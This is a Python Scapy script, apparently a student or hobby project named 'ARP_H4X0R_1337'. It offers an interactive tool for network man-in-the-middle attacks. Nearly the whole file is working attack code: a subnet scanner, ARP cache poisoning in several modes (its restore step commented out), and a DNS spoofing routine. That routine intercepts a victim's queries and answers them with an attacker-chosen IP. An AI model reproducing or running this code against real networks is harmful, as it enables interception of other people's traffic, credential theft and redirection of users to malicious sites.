from tabnanny import verbose
from scapy.all import *
from art import *
import subprocess
import socket
import time
import dummy_thread as _thread
import termios
import tty
import sys
import time
import netifaces

# get host interfaces
if_list = get_if_list()

def set_default_interface():
    if (len(if_list) != 0):
        return if_list[0]
    else:
        return ""

intface = set_default_interface()
sock = conf.L2socket(iface=intface)
# get host ip
host_ip_addr = get_if_addr(intface)
# get host mac
host_mac_addr = get_if_hwaddr(intface)
# get host subnet mask
host_subnet_mask = netifaces.ifaddresses(intface)[netifaces.AF_INET][0]["netmask"]

# list of all active hosts in the subnet
active_hosts = [0]
# list of selected targets, first group
targets_1 = [0]
# list of selected targets, second group
targets_2 = [0]

def print_arp_help_list():
    print("")
    print("+-+-+-+-+-+ ARP +-+-+-+-+-+")
    print("")
    print('help -- open command menu')
    print('ifaces -- get all available interfaces')
    print('if [n] -- set interface to [n]')
    print('getif -- get current interface')
    print('scan -- scan for active hosts on selected interface')
    print('active -- print all currently active hosts')
    print('targets  -- set target hosts to spoof')
    print('gettar [n] -- get all targets in targer group [n]')
    print('poison -- begin ARP poisoning')
    print('       -o [n] -- one-way poison, [n] packets sent in mid phase')
    print('       -a [n] -- all-out poison, [n] packets sent in mid phase')
    print('       -n [n] -- regular poison, [n] packets sent in mid phase')
    print('       -s [n] -- silent poison, [n] packets sent in mid phase')
    print("")

def build_packet(src_ip, src_mac, dest_ip, dest_mac, type):
    arp_pkt = Ether()/ARP()
    arp_pkt[Ether].src = src_mac
    arp_pkt[ARP].hwsrc = src_mac
    arp_pkt[ARP].psrc = src_ip
    arp_pkt[ARP].hwdst = dest_mac
    arp_pkt[ARP].pdst = dest_ip
    arp_pkt[ARP].op = type

    return arp_pkt

def scan_hosts():
    active_hosts[:] = []
    print("Host scanning initiated.")
    # only works for class C networks
    ans, un_ans = arping(".".join(host_ip_addr.split(".")[:3]) + ".*", verbose = False)
    for packet in ans:
        active_hosts.append({"ip_addr" : packet[1].psrc, "mac_addr" : packet[1].hwsrc})
    print("Scan complete. " + str(len(ans)) + " active hosts found on subnet.")

def poison(target1, target2, n, fast_loop):
    p_1_pkts = [0]
    p_1_pkts[:] = []
    for target in target1:
        for spoofed_target in target2:
            pkt_to_add = build_packet(spoofed_target["ip_addr"], host_mac_addr, target["ip_addr"], target["mac_addr"], "who-has")
            p_1_pkts.append(pkt_to_add)
    p_2_pkts = [0]
    p_2_pkts[:] = []
    for target in target2:
        for spoofed_target in target1:
            pkt_to_add = build_packet(spoofed_target["ip_addr"], host_mac_addr, target["ip_addr"], target["mac_addr"], "who-has")
            p_2_pkts.append(pkt_to_add)
    poison_phase_start(p_1_pkts, p_2_pkts)
    for pkt in p_1_pkts:
        pkt[ARP].op = "is-at"
    for pkt in p_2_pkts:
        pkt[ARP].op = "is-at"
    poison_phase_mid(p_1_pkts, p_2_pkts, n, fast_loop)
    legit_pkts_1 = [0]
    legit_pkts_1[:] = []
    for target in target1:
        for spoofed_target in target2:
            pkt_to_add = build_packet(spoofed_target["ip_addr"], spoofed_target["mac_addr"], target["ip_addr"], target["mac_addr"], "is-at")
            legit_pkts_1.append(pkt_to_add)
    legit_pkts_2 = [0]
    legit_pkts_2[:] = []
    for target in target2:
        for spoofed_target in target1:
            pkt_to_add = build_packet(spoofed_target["ip_addr"], spoofed_target["mac_addr"], target["ip_addr"], target["mac_addr"], "is-at")
            legit_pkts_2.append(pkt_to_add)
    #poison_phase_end(legit_pkts_1, legit_pkts_2)
    print("Poisoning ended.")

def poison_phase_start(p_1_pkts, p_2_pkts):
    print("Phase 1 initiated. Poisoning...")
    for i in range(5):
        for pkt in p_1_pkts:
            sendp(pkt, iface=intface, verbose = False)
        for pkt in p_2_pkts:
            sendp(pkt, iface=intface, verbose = False)
        time.sleep(1)
    print("Phase 1 complete.")

def poison_phase_mid(p_1_pkts, p_2_pkts, n, fast_loop):
    print("Phase 2 initiated. Poisoning...")
    for i in range(int(n)):
        for pkt in p_1_pkts:
            sendp(pkt, iface=intface, verbose = False)
        for pkt in p_2_pkts:
            sendp(pkt, iface=intface, verbose = False)
        time.sleep(int(fast_loop))
    print("Phase 2 complete.")

def poison_phase_end(p_1_pkts, p_2_pkts):
    print("Phase 3 initiated. Unpoisoning.")
    for i in range(3):
        for pkt in p_1_pkts:
            sendp(pkt, iface=intface, verbose = False)
        for pkt in p_2_pkts:
            sendp(pkt, iface=intface, verbose = False)
    print("Phase 3 complete.")

def one_way_poison(target_1, target_2, n, fast_loop):
    pkt_to_send = [0]
    pkt_to_send[0] = build_packet(target_2[0]["ip_addr"], host_mac_addr, target_1[0]["ip_addr"], target_1[0]["mac_addr"], "who-has")
    empty_pkts = [0]
    empty_pkts[:] = []
    poison_phase_start(pkt_to_send, empty_pkts)
    pkt_to_send[0] = build_packet(target_2[0]["ip_addr"], host_mac_addr, target_1[0]["ip_addr"], target_1[0]["mac_addr"], "is-at")
    poison_phase_mid(pkt_to_send, empty_pkts, n, fast_loop)
    pkt_to_send[0] = build_packet(target_2[0]["ip_addr"], target_2[0]["mac_addr"], target_1[0]["ip_addr"], target_1[0]["mac_addr"], "is-at")
    poison_phase_end(pkt_to_send, empty_pkts)

def check_for_value(x, target_1, target_2):
    for target in target_1:
        if target["ip_addr"] == x[ARP].psrc and x[ARP].op=="who-has":
            return True
    for target in target_2:
        if target["ip_addr"] == x[ARP].psrc and x[ARP].op=="who-has":
            return True

def silent_poison(target_1, target_2, n):
    counter = 0
    while counter < int(n):
        pkt = sniff(count = 1, iface =intface, filter = "arp", prn=lambda x: check_for_value(x, target_1, target_2))
        pkt_to_send = build_packet(pkt[0][ARP].pdst, host_mac_addr, pkt[0][ARP].psrc, pkt[0][ARP].hwsrc, "is-at")
        print("Packet from " + str(pkt[0][ARP].psrc) + " intercepted. Poisoning.")
        for i in range(2):
            sendp(pkt_to_send, iface = intface, verbose = False)
            time.sleep(1)
        counter = counter + 1
    print("Poisoning ended.")
    return

def get_active_hosts():
    if (active_hosts[0] == 0):
        print("Subnet has not yet been scanned for hosts.")
        return
    else: 
        return active_hosts

def is_host_active(host_ip):
    if (active_hosts[0] == 0):
        print("Subnet has not yet been scanned for hosts.")
        return
    for host in active_hosts:
        if host["ip_addr"] == host_ip:
            return True
    return False

def print_hosts(host_list):
    if (active_hosts[0] == 0):
         print("Subnet has not yet been scanned for hosts.")
         return
    counter = 1
    for host in host_list:
        print("Host #" + str(counter) + " has " + "IP Address: " + str(host["ip_addr"]) + " and " + "MAC Address: " + str(host["mac_addr"]))
        counter = counter + 1

def set_interface(new_interface):
    global sock
    global intface
    global host_ip_addr
    global host_mac_addr
    if (new_interface in if_list):
        intface = new_interface
        host_ip_addr = get_if_addr(intface)
        host_mac_addr = get_if_hwaddr(intface)
        sock = conf.L2socket(iface=intface)
    
def get_interface():
    global intface
    return intface

def arp_command_handler(cmd):
    if (cmd[0] == "scan"):
        scan_hosts()

    elif (cmd[0] == "active"):
        print_hosts(active_hosts)
    elif (cmd[0] == "poison"):
        if (cmd[1] == "-o"):
            looped = cmd[2]
            print("Select target: ")
            cmd = raw_input()
            targets_1[:] = []
            for host in active_hosts:
                if (cmd == host["ip_addr"]):
                    targets_1.append(host)
            print("Select IP spoof: ")
            cmd = raw_input()
            targets_2[:] = []
            for host in active_hosts:
                if (cmd == host["ip_addr"]):
                    targets_2.append(host)
            one_way_poison(targets_1, targets_2, looped, 10)
        elif(cmd[1] == "-a"):
            poison(targets_1, targets_2, cmd[2], 1)
        elif(cmd[1] == "-n"):
            poison(targets_1, targets_2, cmd[2], 10)
        elif(cmd[1] == "-s"):
            silent_poison(targets_1, targets_2, cmd[2])
        else:
            print("Invalid input.")

    elif (cmd[0] == "targets"):
        print("First group: ")
        targets_1[:] = []
        targets_2[:] = []
        grp1_ips = raw_input().split(" ")
        for ip in grp1_ips:
            for host in active_hosts:
                if (ip == host["ip_addr"]):
                    targets_1.append(host)
        print("Second group: ")
        grp2_ips = raw_input().split(" ")
        for ip in grp2_ips:
            for host in active_hosts:
                if (ip == host["ip_addr"]):
                    targets_2.append(host)

    elif (cmd[0] == "gettar"):
        if (cmd[1] == "1"):
            print(targets_1)
        else:
            print(targets_2)

    elif (cmd[0] == ""):
        pass

    elif (cmd[0] == "ifaces"):
        print(if_list)

    elif (cmd[0] == "if"):
        if (len(cmd) == 2 and cmd[1] in if_list):
            set_interface(cmd[1])
            print("Interface set as: " + cmd[1])
        else:
            print("Interface does not exist.")

    elif (cmd[0] == "getif"):
        print(get_interface())
    
    elif (cmd[0] == "help"):
        print_arp_help_list()
    else:
        print("Invalid command.")

def main_arp():
    print("Welcome to ARP_H4X0R_1337(name subject to change). Type 'help' for a list of commands.")
    print("Default interface set as: " + get_interface())
    while (True):
        cmd = raw_input().split(" ")
        arp_command_handler(cmd)

# TODO:
# [] Fake pings
# [] Add multiple targets
# [] Find network submask of host and search for hosts within it
# [] Make # of packets sent during each phase customizable
# [] Add silent attack
# [X] Make attack interruptable
# Make sure interfaces work with host scanning and poisoning

# [] make 2 separate files with newest ARP + code cleanup
# [] make commands to add DNS address to table, select DNS spoof victim
# [] generalise (find gateway router (IP + MAC))

def set_default_spoof_address():
    return "10.0.2.4"

dns_server_ip = "131.155.3.3"
dns_server_mac = "52:54:00:12:35:00"

#[] get server ip
#[*] poison target's arp table
#[*] intercept dns(udp) packets from target(use stopfilter function of sniff in scapy)
#[] send them to server
#[] receive reply from server
#[*] replace ip in server's response with own ip(change checksum)
#[*] send modified packet to client

Target1 = [{"ip_addr" : "10.0.2.6", "mac_addr" : "08:00:27:25:0A:A4"}]
#Target2 = {"ip_addr" : "192.168.56.102", "mac_addr" : "08:00:27:cc:08:6f"}
Target2 = [{"ip_addr" : "10.0.2.1", "mac_addr" : "52:54:00:12:35:00"}]

spoof_address=set_default_spoof_address()
dns_to_spoof={}

def dns_spoof(pkt, ip_of_dns):
    spoofed_pkt=pkt.copy()
    qname=pkt[DNSQR].qname

    spoofed_pkt[Ether].src=pkt[Ether].dst
    spoofed_pkt[Ether].dst=pkt[Ether].src
    spoofed_pkt[IP].src=str(pkt[IP].dst)
    spoofed_pkt[IP].dst=str(pkt[IP].src)
    spoofed_pkt[DNS].an=DNSRR(rrname=qname, rdata=ip_of_dns)
    spoofed_pkt[DNS].ancount=1
    spoofed_pkt[UDP].sport=pkt[UDP].dport
    spoofed_pkt[UDP].dport=pkt[UDP].sport

    del spoofed_pkt[IP].len
    del spoofed_pkt[IP].chksum
    del spoofed_pkt[UDP].len
    del spoofed_pkt[UDP].chksum

    sock.send(spoofed_pkt)

def forward(pkt):
    pkt[Ether].dst=dns_server_mac

    if pkt.haslayer(IP):
        del pkt[IP].len
        del pkt[IP].chksum

    if pkt.haslayer(UDP):
        del pkt[UDP].len
        del pkt[UDP].chksum

    sock.send(pkt)

def dns_react(pkt):
    if pkt.haslayer(DNS) and dns_to_spoof.has_key(pkt[DNSQR].qname):
        dns_spoof(pkt, spoof_address)
    else:
        forward(pkt)

def start_dns_spoof():
    print("Starting DNS spoof attack...")
    sniff(store=0, filter="src host 10.0.2.6", iface="enp0s9", prn = lambda x: dns_react(x))#, timeout=10)
    #sock.close()

def add_dns_address(dns):
    dns_to_spoof[dns+"."]=spoof_address
    print("Table containing DNS addresses to spoof was updated: \"" + dns + ".\"" + " was added.")

def set_spoof_address(ip):
    global spoof_address
    spoof_address=ip
    print("Spoof address was set to: " + ip)

def print_dns_help_list():
    print("")
    print("+-+-+-+-+-+ DNS +-+-+-+-+-+")
    print("")
    print("add [n] -- add DNS address [n] to spoofing table")
    print("set spoof address [n] -- sets the IP address to which the victim is sent when DNS spoofed")
    print("spoof -- start DNS spoof attack")

def find_gateway_router():
    print("Searching for gateway router...")

    global dns_server_ip
    global dns_server_mac
    global Target2

    gws=conf.route.route("0.0.0.0")[2]

    # pkt = Ether(src=host_mac_addr)/IP(src=host_ip_addr)/UDP()/DNS(rd=1, qd=DNSQR("google.com."))
    # ans=srp1()[0]
    dns_server_ip=gws
    dns_server_mac=getmacbyip(gws)

    print("Found gateway router:")
    print("IP: " + dns_server_ip)
    print("MAC: " + dns_server_mac)

    Target2[0]["ip_addr"]=dns_server_ip
    Target2[0]["mac_addr"]=dns_server_mac

def dns_command_handler(cmd):
    if cmd[0]=="add":
        add_dns_address(cmd[1])
    elif cmd[0]=="set" and cmd[1]=="spoof" and cmd[2]=="address":
        set_spoof_address(cmd[3])
    elif cmd[0]=="help":
        print_dns_help_list()
        print_arp_help_list()
    elif cmd[0]=="spoof":
        start_dns_spoof()
    else:
        arp_command_handler(cmd)


def main_dns():
    global Target1
    global Target2

    print("Welcome to ARP_H4X0R_1337 (name subject to change). Type 'help' for a list of commands.")
    print("Default interface set as: " + get_interface())
    find_gateway_router()
    poison(Target1, Target2, 0, 10)
    while (True):
        cmd = raw_input().split(" ")
        dns_command_handler(cmd)

        